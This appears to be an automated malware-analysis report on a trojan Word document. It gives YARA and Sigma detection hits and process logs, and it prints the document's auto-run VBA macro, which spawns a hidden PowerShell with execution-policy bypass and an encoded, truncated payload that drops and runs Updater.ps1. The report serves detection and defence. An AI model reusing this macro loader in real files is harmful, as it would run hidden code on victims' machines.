attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: vkt, Template: Normal.dotm, Last Saved By: michael Gorelik, Revision Number: 16, Name of Creating Application: Microsoft Office Word, Total Editing Time: 08:00, Create Time/Date: Tue Mar  7 23:29:00 2017, Last Saved Time/Date: Tue Feb 28 16:22:00 2017, Number of Pages: 1, Number of Words: 84, Number of Characters: 421, Security: 0

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: Detects a powershell and bypass keyword in a Word document
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

macros.vba_code:
Sub Document_Open()
        Execute
        errorb
        End Sub
             Public Function Execute() As Variant
                Const HIDDEN_WINDOW = 0
                strComputer = "."
                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
         
                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
                Set objConfig = objStartup.SpawnInstance_
                objConfig.ShowWindow = HIDDEN_WINDOW
                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
                objProcess.Create "powershell.exe -WindowStyle hidden -ep Bypass -nologo -noprofile -e " _
& "

sigma_analysis_results.rule_description: Detects suspicious PowerShell invocation with a parameter substring
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)

sigma_analysis_results.rule_title: Suspicious Binaries and Scripts in Public Folder
sigma_analysis_results.rule_description: Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Public\Documents\Updater.ps1; EventID=11}

sigma_analysis_results.rule_description: Detects Powershell as a child of the WmiPrvSE process. Which could be a sign of lateral movement via WMI.

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(' [TRUNCATED]; Path=; ScriptBlockId=b773295b-50a9-4f2e-a13c-d6ed7e8de35a; MessageTotal=; EventID=4104; MessageNumber=}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs

sigma_analysis_results.rule_title: Recon Command Output Piped To Findstr.EXE
sigma_analysis_results.rule_description:
Detects the execution of a potential recon command where the results are piped to "findstr". This is meant to trigger on inline calls of "cmd.exe" via the "/c" or "/k" for example.
Attackers often time use this technique to extract specific information they require in their reconnaissance phase.

match_context.values: @{Product=Microsoft Windows Operating System; CurrentDirectory=C:\Program Files (x86)\AutoIt3\; OriginalFileName=Cmd.Exe; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; Description=Windows Command Processor; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\AutoIt3\AutoIt3.exe" "C:\Users\george\Desktop\script.0.au3"; CommandLine=C:\Windows\system32\cmd.exe /c tasklist /svc | find "svchost.exe" >> \\192.168.2.1\joe-office-g6-18\logs\services.log; EventID=1; ParentImage=C:\Program Files (x86)\AutoIt3\AutoIt3.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Suspicious Execution of Powershell with Base64
sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

match_context.values: @{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft Windows Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding; CommandLine=powershell.exe -WindowStyle hidden -ep Bypass -nologo -noprofile -e  [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\wbem\WmiPrvSE.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding; CommandLine=powershell.exe -WindowStyle hidden -ep Bypass -nologo -noprofile -e  [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\wbem\WmiPrvSE.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft Windows Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding; CommandLine=powershell.exe -WindowStyle hidden -ep Bypass -nologo -noprofile -e  [TRUNCATED]; EventID=1; ParentImage=C:\Windows\System32\wbem\WmiPrvSE.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft Windows Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; EventID=1; ParentCommandLine=powershell.exe -WindowStyle hidden -ep Bypass -nologo -noprofile -e  [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -ep Bypass -nologo -nop -file C:\Users\Public\Documents\Updater.ps1; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=powershell.exe -WindowStyle hidden -ep Bypass -nologo -noprofile -e  [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -ep Bypass -nologo -nop -file C:\Users\Public\Documents\Updater.ps1; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects PowerShell creating a PowerShell file (.ps1). While often times this behavior is benign, sometimes it can be a sign of a dropper script trying to achieve persistence.

match_context.values: @{Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Public\Documents\Updater.ps1}

sigma_analysis_results.rule_description: Detects the use of PowerShell to identify the current logged user.
